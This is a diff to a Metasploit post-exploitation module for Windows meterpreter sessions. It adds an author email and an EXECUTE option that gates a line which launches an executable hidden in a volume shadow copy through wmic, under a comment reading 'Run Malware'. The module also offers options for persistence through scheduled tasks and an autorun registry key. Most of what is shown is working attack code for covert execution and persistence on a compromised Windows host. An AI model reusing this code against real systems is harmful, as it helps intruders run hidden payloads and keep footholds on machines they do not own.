@@ -33,12 +33,13 @@ class Metasploit4 < Msf::Post
       'License'              => MSF_LICENSE,
       'Platform'             => ['win'],
       'SessionTypes'         => ['meterpreter'],
-      'Author'               => ['MrXors'],
+      'Author'               => ['MrXors Mr.Xors<at>gmail.com'],
       'References'           => [[ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ]]
     ))
     register_options(
       [
         OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
+        OptString.new('EXECUTE', [ true, 'Run the .exe on the remote system.', true]),
         OptString.new('SCHTASK', [ false, 'Create a schtask.exe for EXE.', ]),
         OptString.new('RUNKEY', [ false, 'Create AutoRun Key on HKLM\Software\Microsoft\Windows\CurrentVersion\Run .', ]),
         OptInt.new('DELAY', [ false, 'Delay in Minutes for Reconnect attempt.Needs SCHTASK set to true to work.default delay is 1 minute.', 1]),
@@ -112,7 +113,11 @@ class Metasploit4 < Msf::Post
     end
     #-----------------------------------------------------------------------------
     #Run Malware
-    run_malware = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\Windows\\Temp\\#{file_name}", nil, {'Hidden' => true})
+    if datastore["EXECUTE"].nil? or datastore["EXECUTE"].empty?
+      print_status("Not Running .EXE")
+    else
+      run_malware = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\Windows\\Temp\\#{file_name}", nil, {'Hidden' => true})
+    end
     #-----------------------------------------------------------------------------------------------------------------
     #Close Channel 
     r.channel.close
